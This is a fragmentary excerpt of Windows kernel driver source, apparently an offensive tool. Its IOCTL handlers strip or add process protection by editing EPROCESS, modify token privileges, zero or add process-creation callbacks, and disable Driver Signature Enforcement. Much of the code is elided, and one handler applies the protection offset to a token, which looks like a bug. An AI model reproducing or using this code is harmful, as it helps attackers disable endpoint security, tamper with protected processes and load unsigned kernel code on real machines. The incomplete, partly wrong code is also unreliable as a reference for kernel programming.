...
UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\PrototypeDriver");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\PrototypeDriver");
	...
	_In_ PIRP Irp)
{
	...
	//Recover dynamically PS_PORTECT OFFSET
	UNICODE_STRING functionName;
	RtlInitUnicodeString(&functionName, L"PsIsProtectedProcess");

	ULONG64 PsIsProtectedProcess = 0;
	PsIsProtectedProcess = (ULONG64)MmGetSystemRoutineAddress(&functionName);

	ULONG64* PsIsProtectedProcessPointer = reinterpret_cast<ULONG64*>(PsIsProtectedProcess);
	ULONG64 valuePointedByPsIsProtectedProcess = *PsIsProtectedProcessPointer;

	ULONG PS_PROTECT_OFFSET = (valuePointedByPsIsProtectedProcess >> 16) & 0xFFF;
	//
	...
	{
	case PROTOTYPE_DRIVER_UNPROTECT_PROCESS:
	{
		...
		DbgPrint("[+] Got EPROCESS for PID %d (0x%08p)\n", target->ProcessId, eProcess);


		PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PS_PROTECT_OFFSET);//PROCESS_PROTECTION_OFFSET[windowsVersion]);
		
		

		DbgPrint("[+] runtime offset : mine : 0x%lX, from array : 0x%lX \n", PS_PROTECT_OFFSET, PROCESS_PROTECTION_OFFSET[windowsVersion]); //presque bon..
	...
	case PROTOTYPE_DRIVER_PROTECT_PROCESS:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
		{
			status = STATUS_BUFFER_TOO_SMALL;
		...
		PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + PS_PROTECT_OFFSET);
	...
	case PROTOTYPE_DRIVER_PROCESS_PRIVILEGE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(TargetProcess))
		{
			status = STATUS_BUFFER_TOO_SMALL;
		...
		PPROCESS_PRIVILEGES tokenPrivs = (PPROCESS_PRIVILEGES) ((ULONG_PTR)pToken + PS_PROTECT_OFFSET);
	...
	case PROTOTYPE_DRIVER_ENUM_PROCESS_CALLBACKS:
	{
	...
	case PROTOTYPE_DRIVER_ZERO_PROCESS_CALLBACK:
	{
	...
	case PROTOTYPE_DRIVER_ADD_PROCESS_CALLBACK:
	{
	...
	case PROTOTYPE_DRIVER_ENUM_DSE:
	{
	...
	case PROTOTYPE_DRIVER_DISABLE_DSE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(DSE))
		{
			status = STATUS_BUFFER_TOO_SMALL;
	...
	case PROTOTYPE_DRIVER_ENABLE_DSE:
	{
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(DSE))
		{
			status = STATUS_BUFFER_TOO_SMALL;
	...
	CALLBACK_INFORMATION* ModuleInfo)
{
	...
	{
		KdPrint(("[!] AuxKlibQueryModuleInformation failed (0x%08X)", status));
		ExFreePoolWithTag(modules, PROTOTYPE_DRIVER_TAG);
		return;
	}
